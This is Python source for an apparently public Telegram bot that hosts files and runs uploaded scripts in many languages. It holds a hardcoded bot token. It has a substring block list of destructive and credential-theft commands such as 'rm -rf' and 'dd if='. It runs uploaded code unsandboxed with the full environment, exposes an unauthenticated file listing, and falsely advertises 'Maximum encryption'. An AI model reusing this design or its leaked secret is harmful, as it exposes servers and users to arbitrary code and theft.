# -*- coding: utf-8 -*-
"""
By @CyberHacked0
Universal File Hosting Bot
Enhanced file hosting system supporting 30+ file types with secure execution
"""

import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
from telebot import types
import time
from datetime import datetime, timedelta
import psutil
import sqlite3
import json
import logging
import signal
import threading
import re
import sys
import atexit
import requests
import ast
from pathlib import Path
import hashlib

# --- Flask Keep Alive ---
from flask import Flask, render_template, jsonify, request, send_file
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return """
    <html>
    <head><title>Universal File Host</title></head>
    <body style="font-family: Arial; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 50px;">
        <h1>File Host By @CyberHacked0</h1>
        <h2>Multi-Language Code Execution & File Hosting Platform</h2>
        <p>📁 Supporting 30+ file types with secure hosting</p>
        <p>🚀 Multi-language code execution with auto-installation</p>
        <p>🛡️ Advanced security & anti-theft protection</p>
        <p>🌟 Real-time execution monitoring</p>
    </body>
    </html>
    """

@app.route('/file/<file_hash>')
def serve_file(file_hash):
    """Serve hosted files by hash"""
    try:
        # Find the file by hash
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                expected_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                if expected_hash == file_hash:
                    file_path = os.path.join(get_user_folder(user_id), file_name)
                    if os.path.exists(file_path):
                        return send_file(file_path, as_attachment=False)

        return "File not found", 404
    except Exception as e:
        logger.error(f"Error serving file {file_hash}: {e}")
        return "Error serving file", 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/files')
def list_files():
    """List all hosted files (for debugging)"""
    try:
        files_list = []
        for user_id in user_files:
            for file_name, file_type in user_files[user_id]:
                if file_type == 'hosted':
                    file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                    files_list.append({
                        'name': file_name,
                        'user_id': user_id,
                        'hash': file_hash,
                        'url': f"/file/{file_hash}"
                    })
        return jsonify({"files": files_list})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print("🌐 Flask Keep-Alive server started.")

# --- Configuration ---
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8432816344:AAH8fPH_S4CK90HWqQaxpD6lQc1NxcRZyJA')
OWNER_ID = int(os.getenv('OWNER_ID', '8062814840'))
ADMIN_ID = int(os.getenv('ADMIN_ID', '8062814840'))
YOUR_USERNAME = os.getenv('BOT_USERNAME', '@CyberHacked0')
UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL', 'https://t.me/nothingbothub')

# Enhanced folder setup
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
UPLOAD_BOTS_DIR = os.path.join(BASE_DIR, 'upload_bots')
IROTECH_DIR = os.path.join(BASE_DIR, 'inf')
DATABASE_PATH = os.path.join(IROTECH_DIR, 'bot_data.db')
LOGS_DIR = os.path.join(BASE_DIR, 'execution_logs')

# File upload limits
FREE_USER_LIMIT = 5
SUBSCRIBED_USER_LIMIT = 25
ADMIN_LIMIT = 999
OWNER_LIMIT = float('inf')

# Create necessary directories
for directory in [UPLOAD_BOTS_DIR, IROTECH_DIR, LOGS_DIR]:
    os.makedirs(directory, exist_ok=True)

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# --- Data structures ---
bot_scripts = {}
user_subscriptions = {}
user_files = {}
active_users = set()
admin_ids = {ADMIN_ID, OWNER_ID}
bot_locked = False
broadcast_mode = {}
clone_requests = {}
user_clones = {}

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, 'bot.log')),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Command Button Layouts ---
COMMAND_BUTTONS_LAYOUT_USER_SPEC = [
    ["📢 Updates Channel"],
    ["📤 Upload File", "📂 Check Files"],
    ["⚡ Bot Speed", "📊 Statistics"],
    ["🤖 Clone Bot", "📞 Contact Owner"]
]

ADMIN_COMMAND_BUTTONS_LAYOUT_USER_SPEC = [
    ["📢 Updates Channel"],
    ["📤 Upload File", "📂 Check Files"],
    ["⚡ Bot Speed", "📊 Statistics"],
    ["💳 Subscriptions", "📢 Broadcast"],
    ["🔒 Lock Bot", "🟢 Running All Code"],
    ["👑 Admin Panel", "🤖 Clone Bot"],
    ["📞 Contact Owner"]
]

# --- Database Functions ---
def init_db():
    """Initialize the database with enhanced tables"""
    logger.info(f"Initializing database at: {DATABASE_PATH}")
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Create tables
        c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                     (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_files
                     (user_id INTEGER, file_name TEXT, file_type TEXT,
                      PRIMARY KEY (user_id, file_name))''')
        c.execute('''CREATE TABLE IF NOT EXISTS active_users
                     (user_id INTEGER PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS admins
                     (user_id INTEGER PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS running_scripts
                     (user_id INTEGER, file_name TEXT, start_time TEXT,
                      PRIMARY KEY (user_id, file_name))''')

        # Ensure admins
        c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (OWNER_ID,))
        if ADMIN_ID != OWNER_ID:
            c.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (ADMIN_ID,))

        conn.commit()
        conn.close()
        logger.info("Database initialized successfully.")
    except Exception as e:
        logger.error(f"Database initialization error: {e}")

def load_data():
    """Load data from database into memory"""
    logger.info("Loading data from database...")
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()

        # Load subscriptions
        c.execute('SELECT user_id, expiry FROM subscriptions')
        for user_id, expiry in c.fetchall():
            try:
                user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
            except ValueError:
                logger.warning(f"Invalid expiry date for user {user_id}")

        # Load user files
        c.execute('SELECT user_id, file_name, file_type FROM user_files')
        for user_id, file_name, file_type in c.fetchall():
            if user_id not in user_files:
                user_files[user_id] = []
            user_files[user_id].append((file_name, file_type))

        # Load active users
        c.execute('SELECT user_id FROM active_users')
        active_users.update(user_id for (user_id,) in c.fetchall())

        # Load admins
        c.execute('SELECT user_id FROM admins')
        admin_ids.update(user_id for (user_id,) in c.fetchall())

        # Load running scripts and auto-restart them
        c.execute('SELECT user_id, file_name, start_time FROM running_scripts')
        for user_id, file_name, start_time in c.fetchall():
            user_folder = get_user_folder(user_id)
            file_path = os.path.join(user_folder, file_name)
            if os.path.exists(file_path):
                logger.info(f"Auto-restarting script: {file_name} for user {user_id}")
                success, result = execute_script(user_id, file_path)
                if success:
                    logger.info(f"Successfully auto-restarted: {file_name}")
                else:
                    logger.error(f"Failed to auto-restart {file_name}: {result}")

        conn.close()
        logger.info(f"Data loaded: {len(active_users)} users, {len(user_files)} file records")
    except Exception as e:
        logger.error(f"Error loading data: {e}")

def save_running_script(user_id, file_name):
    """Save running script to database for auto-restart"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR REPLACE INTO running_scripts (user_id, file_name, start_time) VALUES (?, ?, ?)',
                 (user_id, file_name, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error saving running script: {e}")

def remove_running_script(user_id, file_name):
    """Remove running script from database"""
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('DELETE FROM running_scripts WHERE user_id = ? AND file_name = ?', (user_id, file_name))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Error removing running script: {e}")

# --- Helper Functions ---
def get_user_folder(user_id):
    """Get or create user's folder for storing files"""
    user_folder = os.path.join(UPLOAD_BOTS_DIR, str(user_id))
    os.makedirs(user_folder, exist_ok=True)
    return user_folder

def get_user_file_limit(user_id):
    """Get the file upload limit for a user"""
    if user_id == OWNER_ID: return OWNER_LIMIT
    if user_id in admin_ids: return ADMIN_LIMIT
    if user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now():
        return SUBSCRIBED_USER_LIMIT
    return FREE_USER_LIMIT

def get_user_file_count(user_id):
    """Get the number of files uploaded by a user"""
    return len(user_files.get(user_id, []))

def is_bot_running(script_owner_id, file_name):
    """Check if a bot script is currently running"""
    script_key = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if script_info and script_info.get('process'):
        try:
            proc = psutil.Process(script_info['process'].pid)
            is_running = proc.is_running() and proc.status() != psutil.STATUS_ZOMBIE
            if not is_running:
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
            return is_running
        except psutil.NoSuchProcess:
            if script_key in bot_scripts:
                del bot_scripts[script_key]
            return False
        except Exception:
            return False
    return False

def get_script_uptime(script_owner_id, file_name):
    """Get the uptime of a running script"""
    script_key = f"{script_owner_id}_{file_name}"
    script_info = bot_scripts.get(script_key)
    if script_info and script_info.get('start_time'):
        uptime = datetime.now() - script_info['start_time']
        return str(uptime).split('.')[0]  # Remove microseconds
    return None

def safe_send_message(chat_id, text, parse_mode=None, reply_markup=None):
    """Safely send message with fallback for parse errors"""
    try:
        return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Send without parse_mode if there's a parsing error
            return bot.send_message(chat_id, text, reply_markup=reply_markup)
        else:
            raise e

def safe_edit_message(chat_id, message_id, text, parse_mode=None, reply_markup=None):
    """Safely edit message with fallback for parse errors"""
    try:
        return bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Edit without parse_mode if there's a parsing error
            return bot.edit_message_text(text, chat_id, message_id, reply_markup=reply_markup)
        else:
            raise e

def safe_reply_to(message, text, parse_mode=None, reply_markup=None):
    """Safely reply to message with fallback for parse errors"""
    try:
        return bot.reply_to(message, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        if "can't parse entities" in str(e):
            # Reply without parse_mode if there's a parsing error
            return bot.reply_to(message, text, reply_markup=reply_markup)
        else:
            raise e

# --- Enhanced File Execution with Better Hosting ---
def check_malicious_code(file_path):
    """Security check for system commands and malicious patterns"""
    # Only block actual system commands and malicious patterns
    critical_patterns = [
        # System commands that could harm the system
        'sudo ', 'su ', 'rm -rf', 'fdisk',
        'mkfs', 'dd if=', 'shutdown', 'reboot', 'halt',
        
        # Command injection patterns
        '/ls', '/cd', '/pwd', '/cat', '/grep', '/find',
        '/del', '/get', '/getall', '/download', '/upload',
        '/steal', '/hack', '/dump', '/extract', '/copy',
        
        # File stealing bot patterns
        'bot.send_document', 'send_document', 'bot.get_file',
        'download_file', 'send_media_group',
        
        # System execution with dangerous commands
        'os.system("rm', 'os.system("sudo', 'os.system("format',
        'subprocess.call(["rm"', 'subprocess.call(["sudo"',
        'subprocess.run(["rm"', 'subprocess.run(["sudo"',
        
        # Direct system command execution
        'os.system("/bin/', 'os.system("/usr/', 'os.system("/sbin/',
        
        # Dangerous file operations
        'shutil.rmtree("/"', 'os.remove("/"', 'os.unlink("/"',
        
        # Network-based file theft
        'requests.post.*files=', 'urllib.request.urlopen.*data=',
        
        # Process killing patterns
        'os.kill(', 'signal.SIGKILL', 'psutil.process_iter',
        
        # Environment manipulation
        'os.environ["PATH"]', 'os.putenv("PATH"',
        
        # Privilege escalation
        'setuid', 'setgid', 'chmod 777', 'chown root',
        
        # Actual format commands (disk formatting)
        'os.system("format', 'subprocess.call(["format"', 'subprocess.run(["format"'
    ]

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            content_lower = content.lower()

        # Check for critical security violations
        for pattern in critical_patterns:
            if pattern.lower() in content_lower:
                return False, f"SECURITY THREAT: {pattern} detected - File upload blocked!"

        # Check for suspicious file theft combinations
        theft_combos = [
            ['os.listdir', 'send_document'],
            ['os.walk', 'bot.send'],
            ['glob.glob', 'upload'],
            ['open(', 'send_document'],
            ['read()', 'bot.send']
        ]

        for combo in theft_combos:
            if all(item.lower() in content_lower for item in combo):
                return False, f"File theft pattern detected: {' + '.join(combo)}"

        # Check file size limit
        file_size = os.path.getsize(file_path)
        if file_size > 5 * 1024 * 1024:  # 5MB limit
            return False, "File too large - exceeds 5MB limit"

        return True, "Code appears safe"
    except Exception as e:
        return False, f"Error scanning file: {e}"

def auto_install_dependencies(file_path, file_ext, user_folder):
    """Auto-install dependencies based on file type"""
    installations = []
    
    try:
        if file_ext == '.py':
            # Python dependency detection
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Common Python packages
            python_packages = {
                'requests': 'requests',
                'flask': 'flask',
                'django': 'django',
                'numpy': 'numpy',
                'pandas': 'pandas',
                'matplotlib': 'matplotlib',
                'scipy': 'scipy',
                'sklearn': 'scikit-learn',
                'cv2': 'opencv-python',
                'PIL': 'Pillow',
                'bs4': 'beautifulsoup4',
                'selenium': 'selenium',
                'telebot': 'pyTelegramBotAPI',
                'telegram': 'python-telegram-bot',
                'asyncio': None,  # Built-in
                'json': None,     # Built-in
                'os': None,       # Built-in
                'sys': None,      # Built-in
                're': None,       # Built-in
                'time': None,     # Built-in
                'datetime': None, # Built-in
                'random': None,   # Built-in
                'math': None,     # Built-in
                'urllib': None,   # Built-in
                'sqlite3': None,  # Built-in
                'threading': None,# Built-in
                'subprocess': None,# Built-in
                'pathlib': None,  # Built-in
                'collections': None,# Built-in
            }
            
            import_pattern = r'(?:from\s+(\w+)|import\s+(\w+))'
            matches = re.findall(import_pattern, content)
            
            for match in matches:
                module = match[0] or match[1]
                if module in python_packages and python_packages[module]:
                    try:
                        result = subprocess.run([sys.executable, '-m', 'pip', 'install', python_packages[module]], 
                                               capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            installations.append(f"✅ Installed Python package: {python_packages[module]}")
                        else:
                            installations.append(f"❌ Failed to install: {python_packages[module]}")
                    except Exception as e:
                        installations.append(f"❌ Error installing {python_packages[module]}: {str(e)}")
        
        elif file_ext == '.js':
            # JavaScript/Node.js dependency detection
            package_json_path = os.path.join(user_folder, 'package.json')
            if not os.path.exists(package_json_path):
                # Create basic package.json
                package_data = {
                    "name": "user-script",
                    "version": "1.0.0",
                    "description": "Auto-generated package.json",
                    "main": "index.js",
                    "dependencies": {}
                }
                with open(package_json_path, 'w') as f:
                    json.dump(package_data, f, indent=2)
            
            # Common Node.js packages
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            node_packages = {
                'express': 'express',
                'axios': 'axios',
                'lodash': 'lodash',
                'moment': 'moment',
                'fs': None,      # Built-in
                'path': None,    # Built-in
                'http': None,    # Built-in
                'https': None,   # Built-in
                'url': None,     # Built-in
                'crypto': None,  # Built-in
                'os': None,      # Built-in
                'util': None,    # Built-in
            }
            
            require_pattern = r'require\([\'"](\w+)[\'"]\)'
            matches = re.findall(require_pattern, content)
            
            for module in matches:
                if module in node_packages and node_packages[module]:
                    try:
                        result = subprocess.run(['npm', 'install', node_packages[module]], 
                                               cwd=user_folder, capture_output=True, text=True, timeout=30)
                        if result.returncode == 0:
                            installations.append(f"✅ Installed Node package: {node_packages[module]}")
                        else:
                            installations.append(f"❌ Failed to install: {node_packages[module]}")
                    except Exception as e:
                        installations.append(f"❌ Error installing {node_packages[module]}: {str(e)}")
    
    except Exception as e:
        installations.append(f"❌ Error during dependency analysis: {str(e)}")
    
    return installations

def execute_script(user_id, script_path, message_for_updates=None):
    """Execute a script with comprehensive language support and hosting"""
    script_name = os.path.basename(script_path)
    script_ext = os.path.splitext(script_path)[1].lower()

    # Comprehensive supported file types
    supported_types = {
        # Programming Languages (Executable)
        '.py': {'name': 'Python', 'icon': '🐍', 'executable': True, 'type': 'executable'},
        '.js': {'name': 'JavaScript', 'icon': '🟨', 'executable': True, 'type': 'executable'},
        '.java': {'name': 'Java', 'icon': '☕', 'executable': True, 'type': 'executable'},
        '.cpp': {'name': 'C++', 'icon': '🔧', 'executable': True, 'type': 'executable'},
        '.c': {'name': 'C', 'icon': '🔧', 'executable': True, 'type': 'executable'},
        '.sh': {'name': 'Shell', 'icon': '🖥️', 'executable': True, 'type': 'executable'},
        '.rb': {'name': 'Ruby', 'icon': '💎', 'executable': True, 'type': 'executable'},
        '.go': {'name': 'Go', 'icon': '🐹', 'executable': True, 'type': 'executable'},
        '.rs': {'name': 'Rust', 'icon': '🦀', 'executable': True, 'type': 'executable'},
        '.php': {'name': 'PHP', 'icon': '🐘', 'executable': True, 'type': 'executable'},
        '.cs': {'name': 'C#', 'icon': '💜', 'executable': True, 'type': 'executable'},
        '.kt': {'name': 'Kotlin', 'icon': '🟣', 'executable': True, 'type': 'executable'},
        '.swift': {'name': 'Swift', 'icon': '🍎', 'executable': True, 'type': 'executable'},
        '.dart': {'name': 'Dart', 'icon': '🎯', 'executable': True, 'type': 'executable'},
        '.ts': {'name': 'TypeScript', 'icon': '🔷', 'executable': True, 'type': 'executable'},
        '.lua': {'name': 'Lua', 'icon': '🌙', 'executable': True, 'type': 'executable'},
        '.perl': {'name': 'Perl', 'icon': '🐪', 'executable': True, 'type': 'executable'},
        '.scala': {'name': 'Scala', 'icon': '🔴', 'executable': True, 'type': 'executable'},
        '.r': {'name': 'R', 'icon': '📊', 'executable': True, 'type': 'executable'},

        # Hosted Files (Non-executable)
        '.html': {'name': 'HTML', 'icon': '🌐', 'executable': False, 'type': 'hosted'},
        '.css': {'name': 'CSS', 'icon': '🎨', 'executable': False, 'type': 'hosted'},
        '.xml': {'name': 'XML', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.json': {'name': 'JSON', 'icon': '📋', 'executable': False, 'type': 'hosted'},
        '.yaml': {'name': 'YAML', 'icon': '⚙️', 'executable': False, 'type': 'hosted'},
        '.yml': {'name': 'YAML', 'icon': '⚙️', 'executable': False, 'type': 'hosted'},
        '.md': {'name': 'Markdown', 'icon': '📝', 'executable': False, 'type': 'hosted'},
        '.txt': {'name': 'Text', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.jpg': {'name': 'JPEG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.jpeg': {'name': 'JPEG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.png': {'name': 'PNG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.gif': {'name': 'GIF Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.svg': {'name': 'SVG Image', 'icon': '🖼️', 'executable': False, 'type': 'hosted'},
        '.pdf': {'name': 'PDF Document', 'icon': '📄', 'executable': False, 'type': 'hosted'},
        '.zip': {'name': 'ZIP Archive', 'icon': '📦', 'executable': False, 'type': 'hosted'},
        '.sql': {'name': 'SQL Script', 'icon': '🗄️', 'executable': False, 'type': 'hosted'},
        '.bat': {'name': 'Batch Script', 'icon': '🖥️', 'executable': True, 'type': 'executable'},
        '.ps1': {'name': 'PowerShell', 'icon': '💙', 'executable': True, 'type': 'executable'},
    }

    if script_ext not in supported_types:
        return False, f"Unsupported file type: {script_ext}"

    lang_info = supported_types[script_ext]

    try:
        # Send initial message
        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"{lang_info['icon']} Processing {lang_info['name']} file\n"
                f"File: {script_name}\n"
                f"Status: Analyzing..."
            )

        # Check if file is executable
        if not lang_info.get('executable', True):
            # Just host the file (non-executable)
            if message_for_updates:
                # Generate file URL for hosted files
                file_hash = hashlib.md5(f"{user_id}_{script_name}".encode()).hexdigest()
                repl_slug = os.environ.get('REPL_SLUG', 'universal-file-host')
                repl_owner = os.environ.get('REPL_OWNER', 'replit-user')
                file_url = f"https://{repl_slug}-{repl_owner}.replit.app/file/{file_hash}"

                success_msg = f"{lang_info['icon']} {lang_info['name']} file hosted successfully!\n\n"
                success_msg += f"File: {script_name}\n"
                success_msg += f"Status: Securely hosted\n"
                success_msg += f"URL: {file_url}\n"
                success_msg += f"Access: Use 'Check Files' button\n"
                success_msg += f"Security: Maximum encryption\n\n"
                success_msg += f"Your {lang_info['name']} file is now accessible!"
                
                safe_edit_message(
                    message_for_updates.chat.id, 
                    message_for_updates.message_id, 
                    success_msg
                )
            return True, f"File hosted successfully"

        # Execute the script for executable types
        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id,
                message_for_updates.message_id,
                f"{lang_info['icon']} Executing {lang_info['name']} script...\n"
                f"File: {script_name}\n"
                f"Status: Installing dependencies..."
            )

        # Auto-install dependencies
        user_folder = get_user_folder(user_id)
        installations = auto_install_dependencies(script_path, script_ext, user_folder)
        
        if installations and message_for_updates:
            install_msg = f"{lang_info['icon']} Dependency installation:\n\n" + "\n".join(installations[:5])
            if len(installations) > 5:
                install_msg += f"\n... and {len(installations) - 5} more"
            safe_send_message(message_for_updates.chat.id, install_msg)

        # Prepare execution command based on file type
        if script_ext == '.py':
            cmd = [sys.executable, script_path]
        elif script_ext == '.js':
            cmd = ['node', script_path]
        elif script_ext == '.java':
            # Compile and run Java
            class_name = os.path.splitext(script_name)[0]
            compile_result = subprocess.run(['javac', script_path], capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"Java compilation failed: {compile_result.stderr}"
            cmd = ['java', '-cp', os.path.dirname(script_path), class_name]
        elif script_ext in ['.cpp', '.c']:
            # Compile and run C/C++
            executable = os.path.join(user_folder, 'output')
            compiler = 'g++' if script_ext == '.cpp' else 'gcc'
            compile_result = subprocess.run([compiler, script_path, '-o', executable], 
                                          capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"C/C++ compilation failed: {compile_result.stderr}"
            cmd = [executable]
        elif script_ext == '.go':
            cmd = ['go', 'run', script_path]
        elif script_ext == '.rs':
            # Compile and run Rust
            executable = os.path.join(user_folder, 'output')
            compile_result = subprocess.run(['rustc', script_path, '-o', executable], 
                                          capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"Rust compilation failed: {compile_result.stderr}"
            cmd = [executable]
        elif script_ext == '.php':
            cmd = ['php', script_path]
        elif script_ext == '.rb':
            cmd = ['ruby', script_path]
        elif script_ext == '.lua':
            cmd = ['lua', script_path]
        elif script_ext == '.sh':
            cmd = ['bash', script_path]
        elif script_ext == '.ts':
            # TypeScript - compile to JS first
            js_path = script_path.replace('.ts', '.js')
            compile_result = subprocess.run(['tsc', script_path], capture_output=True, text=True, timeout=60)
            if compile_result.returncode != 0:
                return False, f"TypeScript compilation failed: {compile_result.stderr}"
            cmd = ['node', js_path]
        else:
            # For other types, try basic execution
            cmd = [script_path]

        # Create execution log file
        log_file_path = os.path.join(LOGS_DIR, f"execution_{user_id}_{int(time.time())}.log")

        with open(log_file_path, 'w') as log_file:
            process = subprocess.Popen(
                cmd,
                stdout=log_file,
                stderr=subprocess.STDOUT,
                cwd=os.path.dirname(script_path),
                env=os.environ.copy()
            )

            # Store process info
            script_key = f"{user_id}_{script_name}"
            bot_scripts[script_key] = {
                'process': process,
                'script_key': script_key,
                'user_id': user_id,
                'file_name': script_name,
                'start_time': datetime.now(),
                'log_file_path': log_file_path,
                'language': lang_info['name'],
                'icon': lang_info['icon']
            }

            # Save to database for auto-restart
            save_running_script(user_id, script_name)

            # Success message
            if message_for_updates:
                success_msg = f"{lang_info['icon']} {lang_info['name']} script started successfully!\n\n"
                success_msg += f"File: {script_name}\n"
                success_msg += f"Process ID: {process.pid}\n"
                success_msg += f"Language: {lang_info['name']} {lang_info['icon']}\n"
                success_msg += f"Status: Running\n"
                success_msg += f"⏰ Start Time: {datetime.now().strftime('%H:%M:%S')}"

                safe_edit_message(
                    message_for_updates.chat.id, 
                    message_for_updates.message_id, 
                    success_msg
                )

            return True, f"Script started with PID {process.pid}"

    except Exception as e:
        error_msg = f"Execution failed: {str(e)}"
        logger.error(f"Script execution error for user {user_id}: {e}")

        if message_for_updates:
            safe_edit_message(
                message_for_updates.chat.id, 
                message_for_updates.message_id, 
                f"❌ {error_msg}"
            )

        return False, error_msg

# --- Subscription Management Commands ---
@bot.message_handler(commands=['addsub'])
def add_subscription(message):
    """Add subscription to a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 3:
            safe_reply_to(message, "❌ Usage: /addsub <user_id> <days>")
            return

        target_user_id = int(parts[1])
        days = int(parts[2])
        
        expiry_date = datetime.now() + timedelta(days=days)
        user_subscriptions[target_user_id] = {'expiry': expiry_date}
        
        # Save to database
        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)',
                     (target_user_id, expiry_date.isoformat()))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error saving subscription: {e}")

        safe_reply_to(message, f"✅ Subscription added!\n\nUser: {target_user_id}\nDays: {days}\nExpiry: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['removesub'])
def remove_subscription(message):
    """Remove subscription from a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            safe_reply_to(message, "❌ Usage: /removesub <user_id>")
            return

        target_user_id = int(parts[1])
        
        if target_user_id in user_subscriptions:
            del user_subscriptions[target_user_id]
            
            # Remove from database
            try:
                conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
                c = conn.cursor()
                c.execute('DELETE FROM subscriptions WHERE user_id = ?', (target_user_id,))
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"Database error removing subscription: {e}")

            safe_reply_to(message, f"✅ Subscription removed!\n\nUser: {target_user_id}")
        else:
            safe_reply_to(message, f"❌ No subscription found for user: {target_user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['checksub'])
def check_subscription(message):
    """Check subscription status of a user"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    try:
        parts = message.text.split()
        if len(parts) != 2:
            safe_reply_to(message, "❌ Usage: /checksub <user_id>")
            return

        target_user_id = int(parts[1])
        
        if target_user_id in user_subscriptions:
            expiry = user_subscriptions[target_user_id]['expiry']
            is_active = expiry > datetime.now()
            status = "🟢 ACTIVE" if is_active else "🔴 EXPIRED"
            
            sub_info = f"📊 Subscription Status\n\n"
            sub_info += f"User ID: {target_user_id}\n"
            sub_info += f"Status: {status}\n"
            sub_info += f"Expiry: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
            sub_info += f"Time Left: {str(expiry - datetime.now()).split('.')[0] if is_active else 'Expired'}"
            
            safe_reply_to(message, sub_info)
        else:
            safe_reply_to(message, f"❌ No subscription found for user: {target_user_id}")

    except Exception as e:
        safe_reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['users'])
def list_users(message):
    """List all active users with details"""
    user_id = message.from_user.id
    if user_id not in admin_ids:
        safe_reply_to(message, "🚫 Access Denied\n\nAdmin privileges required!")
        return

    if not active_users:
        safe_reply_to(message, "📊 No active users found.")
        return

    users_text = f"📊 Active Users: {len(active_users)}\n\n"
    
    for i, user_id in enumerate(list(active_users)[:50], 1):  # Show first 50 users
        file_count = get_user_file_count(user_id)
        is_subscribed = user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()
        subscription_status = "🟢 SUBSCRIBED" if is_subscribed else "🔴 FREE"
        
        users_text += f"{i}. User ID: {user_id}\n"
        users_text += f"   Files: {file_count}\n"
        users_text += f"   Status: {subscription_status}\n\n"

    if len(active_users) > 50:
        users_text += f"... and {len(active_users) - 50} more users"

    safe_reply_to(message, users_text)

# --- Command Handlers ---
@bot.message_handler(commands=['start'])
def start_command(message):
    """Enhanced start command with comprehensive file type support"""
    user_id = message.from_user.id

    # Add user to active users
    active_users.add(user_id)

    # Save to database
    try:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
        c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Database error in start command: {e}")

    # Get user info
    user_name = message.from_user.first_name or "User"
    is_admin = user_id in admin_ids

    # Create welcome message
    welcome_msg = f"🔐 UNIVERSAL FILE HOST\n\n"
    welcome_msg += f"👋 Welcome {user_name}!\n\n"
    welcome_msg += f"📁 SUPPORTED FILE TYPES:\n"
    welcome_msg += f"🚀 Executable: Python, JavaScript, Java, C/C++, Go, Rust, PHP, Shell, Ruby, TypeScript, Lua, Perl, Scala, R\n\n"
    welcome_msg += f"📄 Hosted: HTML, CSS, XML, JSON, YAML, Markdown, Text, Images, PDFs, Archives\n\n"
    welcome_msg += f"🔐 FEATURES:\n"
    welcome_msg += f"✅ Universal file hosting (30+ types)\n"
    welcome_msg += f"🚀 Multi-language code execution\n"
    welcome_msg += f"🛡️ Advanced security scanning\n"
    welcome_msg += f"🌐 Real-time monitoring\n"
